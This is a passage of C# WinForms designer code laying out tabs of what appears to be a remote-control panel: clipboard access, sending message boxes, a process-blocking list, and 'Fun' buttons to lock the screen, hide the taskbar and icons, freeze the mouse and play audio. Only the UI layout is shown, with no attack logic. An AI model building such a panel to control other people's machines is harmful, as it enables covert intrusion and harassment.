        this.toolStripSeparator3.Name = "toolStripSeparator3";
        this.toolStripSeparator3.Size = new System.Drawing.Size(6, 25);
        this.ClipCopy.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.ClipCopy.Image = (System.Drawing.Image)resources.GetObject("ClipCopy.Image");
        this.ClipCopy.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.ClipCopy.Name = "ClipCopy";
        this.ClipCopy.Size = new System.Drawing.Size(42, 22);
        this.ClipCopy.Text = " Copy";
        this.ClipCopy.Click += new System.EventHandler(ClipCopy_Click);
        this.ClipPaste.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.ClipPaste.Image = (System.Drawing.Image)resources.GetObject("ClipPaste.Image");
        this.ClipPaste.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.ClipPaste.Name = "ClipPaste";
        this.ClipPaste.Size = new System.Drawing.Size(39, 22);
        this.ClipPaste.Text = "Paste";
        this.ClipPaste.Click += new System.EventHandler(ClipPaste_Click);
        this.ClipClear.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.ClipClear.Image = (System.Drawing.Image)resources.GetObject("ClipClear.Image");
        this.ClipClear.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.ClipClear.Name = "ClipClear";
        this.ClipClear.Size = new System.Drawing.Size(38, 22);
        this.ClipClear.Text = "Clear";
        this.ClipClear.Click += new System.EventHandler(ClipClear_Click);
        this.richTextBoxClipboard.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.richTextBoxClipboard.BackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.richTextBoxClipboard.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.richTextBoxClipboard.Location = new System.Drawing.Point(3, 28);
        this.richTextBoxClipboard.Name = "richTextBoxClipboard";
        this.richTextBoxClipboard.Size = new System.Drawing.Size(738, 387);
        this.richTextBoxClipboard.TabIndex = 6;
        this.richTextBoxClipboard.Tag = "";
        this.richTextBoxClipboard.Text = "";
        this.PageMessageBox.Controls.Add(this.toolStrip3);
        this.PageMessageBox.Controls.Add(this.RichMesgBox);
        this.PageMessageBox.Location = new System.Drawing.Point(4, 4);
        this.PageMessageBox.Name = "PageMessageBox";
        this.PageMessageBox.Size = new System.Drawing.Size(741, 416);
        this.PageMessageBox.TabIndex = 4;
        this.PageMessageBox.Text = "PageMessageBox";
        this.PageMessageBox.UseVisualStyleBackColor = true;
        this.toolStrip3.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[9] { this.toolStripSeparator4, this.TestMessageBox, this.SendMessageBox, this.toolStripLabel1, this.TitleMessageBox, this.toolStripLabel4, this.ComTypeMessageBox, this.toolStripLabel5, this.ComIconMessageBox });
        this.toolStrip3.Location = new System.Drawing.Point(0, 0);
        this.toolStrip3.Name = "toolStrip3";
        this.toolStrip3.Size = new System.Drawing.Size(741, 25);
        this.toolStrip3.TabIndex = 9;
        this.toolStrip3.Text = "toolStrip3";
        this.toolStripSeparator4.Name = "toolStripSeparator4";
        this.toolStripSeparator4.Size = new System.Drawing.Size(6, 25);
        this.TestMessageBox.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.TestMessageBox.Image = (System.Drawing.Image)resources.GetObject("TestMessageBox.Image");
        this.TestMessageBox.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.TestMessageBox.Name = "TestMessageBox";
        this.TestMessageBox.Size = new System.Drawing.Size(31, 22);
        this.TestMessageBox.Text = "Test";
        this.TestMessageBox.Click += new System.EventHandler(TestMessageBox_Click);
        this.SendMessageBox.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.SendMessageBox.Image = (System.Drawing.Image)resources.GetObject("SendMessageBox.Image");
        this.SendMessageBox.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.SendMessageBox.Name = "SendMessageBox";
        this.SendMessageBox.Size = new System.Drawing.Size(46, 22);
        this.SendMessageBox.Text = "   Send";
        this.SendMessageBox.Click += new System.EventHandler(SendMessageBox_Click);
        this.toolStripLabel1.Name = "toolStripLabel1";
        this.toolStripLabel1.Size = new System.Drawing.Size(59, 22);
        this.toolStripLabel1.Text = "        Title :";
        this.TitleMessageBox.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TitleMessageBox.Name = "TitleMessageBox";
        this.TitleMessageBox.Size = new System.Drawing.Size(180, 25);
        this.toolStripLabel4.Name = "toolStripLabel4";
        this.toolStripLabel4.Size = new System.Drawing.Size(61, 22);
        this.toolStripLabel4.Text = "        Type :";
        this.ComTypeMessageBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComTypeMessageBox.Items.AddRange(new object[6] { "Yes | No", "Yes | No | Cancel", "Ok", "OK | Cancel", "Retry | Cancel", "About | Retry | Ignore" });
        this.ComTypeMessageBox.Name = "ComTypeMessageBox";
        this.ComTypeMessageBox.Size = new System.Drawing.Size(120, 25);
        this.toolStripLabel5.Name = "toolStripLabel5";
        this.toolStripLabel5.Size = new System.Drawing.Size(48, 22);
        this.toolStripLabel5.Text = " Icon :   ";
        this.ComIconMessageBox.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComIconMessageBox.Items.AddRange(new object[4] { "Information", "Question", "Warning", "Error" });
        this.ComIconMessageBox.Name = "ComIconMessageBox";
        this.ComIconMessageBox.Size = new System.Drawing.Size(150, 25);
        this.RichMesgBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.RichMesgBox.BackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.RichMesgBox.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.RichMesgBox.Location = new System.Drawing.Point(3, 29);
        this.RichMesgBox.Name = "RichMesgBox";
        this.RichMesgBox.Size = new System.Drawing.Size(738, 387);
        this.RichMesgBox.TabIndex = 8;
        this.RichMesgBox.Tag = "";
        this.RichMesgBox.Text = "";
        this.PageAnti.Controls.Add(this.ListAntiMalware);
        this.PageAnti.Controls.Add(this.toolStrip4);
        this.PageAnti.Location = new System.Drawing.Point(4, 4);
        this.PageAnti.Name = "PageAnti";
        this.PageAnti.Size = new System.Drawing.Size(741, 416);
        this.PageAnti.TabIndex = 5;
        this.PageAnti.Text = "PageAnti";
        this.PageAnti.UseVisualStyleBackColor = true;
        this.ListAntiMalware.AllowUserToAddRows = false;
        this.ListAntiMalware.AllowUserToDeleteRows = false;
        this.ListAntiMalware.AllowUserToResizeColumns = false;
        this.ListAntiMalware.AllowUserToResizeRows = false;
        dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListAntiMalware.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle4;
        this.ListAntiMalware.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListAntiMalware.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListAntiMalware.BackgroundColor = System.Drawing.Color.White;
        this.ListAntiMalware.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListAntiMalware.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListAntiMalware.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListAntiMalware.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle5.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListAntiMalware.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle5;
        this.ListAntiMalware.ColumnHeadersHeight = 30;
        this.ListAntiMalware.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListAntiMalware.Columns.AddRange(this.dataGridViewImageColumn1, this.dataGridViewTextBoxColumn1);
        this.ListAntiMalware.ContextMenuStrip = this.ContexAntiMelware;
        dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle6.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle6.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle6.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListAntiMalware.DefaultCellStyle = dataGridViewCellStyle6;
        this.ListAntiMalware.Dock = System.Windows.Forms.DockStyle.Fill;
        this.ListAntiMalware.EnableHeadersVisualStyles = false;
        this.ListAntiMalware.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListAntiMalware.Location = new System.Drawing.Point(0, 25);
        this.ListAntiMalware.Name = "ListAntiMalware";
        this.ListAntiMalware.RowHeadersVisible = false;
        this.ListAntiMalware.RowHeadersWidth = 27;
        this.ListAntiMalware.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListAntiMalware.ShowCellErrors = false;
        this.ListAntiMalware.ShowEditingIcon = false;
        this.ListAntiMalware.ShowRowErrors = false;
        this.ListAntiMalware.Size = new System.Drawing.Size(741, 391);
        this.ListAntiMalware.TabIndex = 659;
        this.ListAntiMalware.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListAntiMalware.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListAntiMalware.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListAntiMalware.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListAntiMalware.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListAntiMalware.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListAntiMalware.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListAntiMalware.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListAntiMalware.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListAntiMalware.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListAntiMalware.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListAntiMalware.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListAntiMalware.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListAntiMalware.ThemeStyle.HeaderStyle.Height = 30;
        this.ListAntiMalware.ThemeStyle.ReadOnly = false;
        this.ListAntiMalware.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListAntiMalware.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListAntiMalware.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListAntiMalware.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListAntiMalware.ThemeStyle.RowsStyle.Height = 22;
        this.ListAntiMalware.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListAntiMalware.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.dataGridViewImageColumn1.HeaderText = "";
        this.dataGridViewImageColumn1.Name = "dataGridViewImageColumn1";
        this.dataGridViewImageColumn1.Width = 5;
        this.dataGridViewTextBoxColumn1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.dataGridViewTextBoxColumn1.HeaderText = "Peocess name";
        this.dataGridViewTextBoxColumn1.Name = "dataGridViewTextBoxColumn1";
        this.ContexAntiMelware.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContexAntiMelware.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.DeleteProcessAnti });
        this.ContexAntiMelware.Name = "contextMenuStrip1";
        this.ContexAntiMelware.Size = new System.Drawing.Size(112, 30);
        this.DeleteProcessAnti.BackColor = System.Drawing.Color.White;
        this.DeleteProcessAnti.Image = (System.Drawing.Image)resources.GetObject("DeleteProcessAnti.Image");
        this.DeleteProcessAnti.Name = "DeleteProcessAnti";
        this.DeleteProcessAnti.Size = new System.Drawing.Size(111, 26);
        this.DeleteProcessAnti.Text = "Delete";
        this.DeleteProcessAnti.Click += new System.EventHandler(DeleteProcessAnti_Click);
        this.toolStrip4.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip4.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.toolStripSeparator5, this.PowerAntimalware, this.toolStripLabel6, this.TexProcessname, this.AddProcessname });
        this.toolStrip4.Location = new System.Drawing.Point(0, 0);
        this.toolStrip4.Name = "toolStrip4";
        this.toolStrip4.Size = new System.Drawing.Size(741, 25);
        this.toolStrip4.TabIndex = 10;
        this.toolStrip4.Text = "toolStrip4";
        this.toolStripSeparator5.Name = "toolStripSeparator5";
        this.toolStripSeparator5.Size = new System.Drawing.Size(6, 25);
        this.PowerAntimalware.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.PowerAntimalware.Image = (System.Drawing.Image)resources.GetObject("PowerAntimalware.Image");
        this.PowerAntimalware.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.PowerAntimalware.Name = "PowerAntimalware";
        this.PowerAntimalware.Size = new System.Drawing.Size(35, 22);
        this.PowerAntimalware.Text = "Start";
        this.PowerAntimalware.Click += new System.EventHandler(PowerAntimalware_Click);
        this.toolStripLabel6.Name = "toolStripLabel6";
        this.toolStripLabel6.Size = new System.Drawing.Size(110, 22);
        this.toolStripLabel6.Text = "        Process name :";
        this.TexProcessname.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.TexProcessname.Name = "TexProcessname";
        this.TexProcessname.Size = new System.Drawing.Size(180, 25);
        this.AddProcessname.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.AddProcessname.Image = (System.Drawing.Image)resources.GetObject("AddProcessname.Image");
        this.AddProcessname.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.AddProcessname.Name = "AddProcessname";
        this.AddProcessname.Size = new System.Drawing.Size(33, 22);
        this.AddProcessname.Text = "Add";
        this.AddProcessname.Click += new System.EventHandler(AddProcessname_Click);
        this.PageFun.Controls.Add(this.PlayAudio);
        this.PageFun.Controls.Add(this.StateIndex);
        this.PageFun.Controls.Add(this.guna2HtmlLabel10);
        this.PageFun.Controls.Add(this.StardIndex);
        this.PageFun.Controls.Add(this.StopIndex);
        this.PageFun.Controls.Add(this.FilenameIndex);
        this.PageFun.Controls.Add(this.MouseRestore);
        this.PageFun.Controls.Add(this.guna2HtmlLabel7);
        this.PageFun.Controls.Add(this.MouseStop);
        this.PageFun.Controls.Add(this.ChagneBackgroundDesktop);
        this.PageFun.Controls.Add(this.ShowTaskbar);
        this.PageFun.Controls.Add(this.guna2HtmlLabel4);
        this.PageFun.Controls.Add(this.HideTaskBar);
        this.PageFun.Controls.Add(this.UnlockScreen);
        this.PageFun.Controls.Add(this.ImageIndex);
        this.PageFun.Controls.Add(this.ShowIconDesktop);
        this.PageFun.Controls.Add(this.LockedScreen);
        this.PageFun.Controls.Add(this.guna2HtmlLabel9);
        this.PageFun.Controls.Add(this.HideIconDesktop);
        this.PageFun.Location = new System.Drawing.Point(4, 4);
        this.PageFun.Name = "PageFun";
        this.PageFun.Size = new System.Drawing.Size(741, 416);
        this.PageFun.TabIndex = 6;
        this.PageFun.Text = "PageFun";
        this.PageFun.UseVisualStyleBackColor = true;
        this.PlayAudio.BackColor = System.Drawing.Color.White;
        this.PlayAudio.BorderRadius = 4;
        this.PlayAudio.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.PlayAudio.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.PlayAudio.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.PlayAudio.CheckedState.Parent = this.PlayAudio;
        this.PlayAudio.Cursor = System.Windows.Forms.Cursors.Hand;
        this.PlayAudio.CustomImages.Parent = this.PlayAudio;
        this.PlayAudio.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PlayAudio.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.PlayAudio.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.PlayAudio.ForeColor = System.Drawing.Color.White;
        this.PlayAudio.HoverState.Parent = this.PlayAudio;
        this.PlayAudio.Location = new System.Drawing.Point(13, 266);
        this.PlayAudio.Name = "PlayAudio";
        this.PlayAudio.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.PlayAudio.PressedDepth = 50;
        this.PlayAudio.ShadowDecoration.Parent = this.PlayAudio;
        this.PlayAudio.Size = new System.Drawing.Size(197, 53);
        this.PlayAudio.TabIndex = 760;
        this.PlayAudio.Text = "Play Audio {.wav}";
        this.PlayAudio.Click += new System.EventHandler(PlayAudio_Click);
        this.StateIndex.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.StateIndex.BackColor = System.Drawing.Color.White;
        this.StateIndex.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.StateIndex.ForeColor = System.Drawing.Color.Red;
        this.StateIndex.Location = new System.Drawing.Point(229, 364);
        this.StateIndex.Name = "StateIndex";
        this.StateIndex.Size = new System.Drawing.Size(47, 17);
        this.StateIndex.TabIndex = 759;
        this.StateIndex.Text = "Stopped";
        this.guna2HtmlLabel10.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.guna2HtmlLabel10.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel10.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel10.ForeColor = System.Drawing.Color.Gray;
        this.guna2HtmlLabel10.Location = new System.Drawing.Point(217, 298);
        this.guna2HtmlLabel10.Name = "guna2HtmlLabel10";
        this.guna2HtmlLabel10.Size = new System.Drawing.Size(93, 17);
        this.guna2HtmlLabel10.TabIndex = 758;
        this.guna2HtmlLabel10.Text = "Image Filename :";
        this.StardIndex.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.StardIndex.BackColor = System.Drawing.Color.White;
        this.StardIndex.BorderRadius = 4;
        this.StardIndex.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StardIndex.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StardIndex.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StardIndex.CheckedState.Parent = this.StardIndex;
        this.StardIndex.Cursor = System.Windows.Forms.Cursors.Hand;
        this.StardIndex.CustomImages.Parent = this.StardIndex;
        this.StardIndex.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.StardIndex.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.StardIndex.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.StardIndex.ForeColor = System.Drawing.Color.White;
        this.StardIndex.HoverState.Parent = this.StardIndex;
        this.StardIndex.Location = new System.Drawing.Point(630, 367);
        this.StardIndex.Name = "StardIndex";
        this.StardIndex.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.StardIndex.PressedDepth = 50;
        this.StardIndex.ShadowDecoration.Parent = this.StardIndex;
        this.StardIndex.Size = new System.Drawing.Size(96, 26);
        this.StardIndex.TabIndex = 753;
        this.StardIndex.Text = "Start";
        this.StardIndex.Click += new System.EventHandler(StardIndex_Click);
        this.StopIndex.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.StopIndex.BackColor = System.Drawing.Color.White;
        this.StopIndex.BorderRadius = 4;
        this.StopIndex.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StopIndex.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StopIndex.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.StopIndex.CheckedState.Parent = this.StopIndex;
        this.StopIndex.Cursor = System.Windows.Forms.Cursors.Hand;
        this.StopIndex.CustomImages.Parent = this.StopIndex;
        this.StopIndex.Enabled = false;
        this.StopIndex.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.StopIndex.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.StopIndex.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.StopIndex.ForeColor = System.Drawing.Color.White;
        this.StopIndex.HoverState.Parent = this.StopIndex;
        this.StopIndex.Location = new System.Drawing.Point(528, 367);
        this.StopIndex.Name = "StopIndex";
        this.StopIndex.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.StopIndex.PressedDepth = 50;
        this.StopIndex.ShadowDecoration.Parent = this.StopIndex;
        this.StopIndex.Size = new System.Drawing.Size(96, 26);
        this.StopIndex.TabIndex = 750;
        this.StopIndex.Text = "Stop";
        this.StopIndex.Click += new System.EventHandler(StopIndex_Click);
        this.FilenameIndex.AcceptsReturn = false;
        this.FilenameIndex.AcceptsTab = false;
        this.FilenameIndex.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.FilenameIndex.AnimationSpeed = 200;
        this.FilenameIndex.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.FilenameIndex.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.FilenameIndex.AutoSizeHeight = true;
        this.FilenameIndex.BackColor = System.Drawing.Color.Transparent;
        this.FilenameIndex.BackgroundImage = (System.Drawing.Image)resources.GetObject("FilenameIndex.BackgroundImage");
        this.FilenameIndex.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.FilenameIndex.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.FilenameIndex.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.FilenameIndex.BorderColorIdle = System.Drawing.Color.Silver;
        this.FilenameIndex.BorderRadius = 2;
        this.FilenameIndex.BorderThickness = 1;
        this.FilenameIndex.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.FilenameIndex.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.FilenameIndex.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.FilenameIndex.DefaultText = "";
        this.FilenameIndex.FillColor = System.Drawing.Color.White;
        this.FilenameIndex.HideSelection = true;
        this.FilenameIndex.IconLeft = null;
        this.FilenameIndex.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.FilenameIndex.IconPadding = 3;
        this.FilenameIndex.IconRight = Properties.Resources.IconAdd;
        this.FilenameIndex.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.FilenameIndex.Lines = new string[0];
        this.FilenameIndex.Location = new System.Drawing.Point(217, 325);
        this.FilenameIndex.MaxLength = 32767;
        this.FilenameIndex.MinimumSize = new System.Drawing.Size(1, 1);
        this.FilenameIndex.Modified = false;
        this.FilenameIndex.Multiline = false;
        this.FilenameIndex.Name = "FilenameIndex";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameIndex.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.FilenameIndex.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameIndex.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.FilenameIndex.OnIdleState = stateProperties8;
        this.FilenameIndex.Padding = new System.Windows.Forms.Padding(3);
        this.FilenameIndex.PasswordChar = '\0';
        this.FilenameIndex.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.FilenameIndex.PlaceholderText = "";
        this.FilenameIndex.ReadOnly = true;
        this.FilenameIndex.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.FilenameIndex.SelectedText = "";
        this.FilenameIndex.SelectionLength = 0;
        this.FilenameIndex.SelectionStart = 0;
        this.FilenameIndex.ShortcutsEnabled = true;
        this.FilenameIndex.Size = new System.Drawing.Size(510, 28);
        this.FilenameIndex.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.FilenameIndex.TabIndex = 748;
        this.FilenameIndex.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.FilenameIndex.TextMarginBottom = 0;
        this.FilenameIndex.TextMarginLeft = 3;
        this.FilenameIndex.TextMarginTop = 1;
        this.FilenameIndex.TextPlaceholder = "";
        this.FilenameIndex.UseSystemPasswordChar = false;
        this.FilenameIndex.WordWrap = true;
        this.FilenameIndex.OnIconRightClick += new System.EventHandler(FilenameIndex_OnIconRightClick);
        this.MouseRestore.BackColor = System.Drawing.Color.White;
        this.MouseRestore.BorderRadius = 4;
        this.MouseRestore.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseRestore.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseRestore.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseRestore.CheckedState.Parent = this.MouseRestore;
        this.MouseRestore.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MouseRestore.CustomImages.Parent = this.MouseRestore;
        this.MouseRestore.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.MouseRestore.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.MouseRestore.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.MouseRestore.ForeColor = System.Drawing.Color.White;
        this.MouseRestore.HoverState.Parent = this.MouseRestore;
        this.MouseRestore.Location = new System.Drawing.Point(115, 367);
        this.MouseRestore.Name = "MouseRestore";
        this.MouseRestore.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.MouseRestore.PressedDepth = 50;
        this.MouseRestore.ShadowDecoration.Parent = this.MouseRestore;
        this.MouseRestore.Size = new System.Drawing.Size(96, 26);
        this.MouseRestore.TabIndex = 746;
        this.MouseRestore.Text = "Restore";
        this.MouseRestore.Click += new System.EventHandler(MouseRestore_Click);
        this.guna2HtmlLabel7.BackColor = System.Drawing.Color.White;
        this.guna2HtmlLabel7.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.guna2HtmlLabel7.ForeColor = System.Drawing.Color.Black;
        this.guna2HtmlLabel7.Location = new System.Drawing.Point(13, 336);
        this.guna2HtmlLabel7.Name = "guna2HtmlLabel7";
        this.guna2HtmlLabel7.Size = new System.Drawing.Size(90, 17);
        this.guna2HtmlLabel7.TabIndex = 744;
        this.guna2HtmlLabel7.Text = "Mouse Settings :";
        this.MouseStop.BackColor = System.Drawing.Color.White;
        this.MouseStop.BorderRadius = 4;
        this.MouseStop.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseStop.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseStop.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.MouseStop.CheckedState.Parent = this.MouseStop;
        this.MouseStop.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MouseStop.CustomImages.Parent = this.MouseStop;
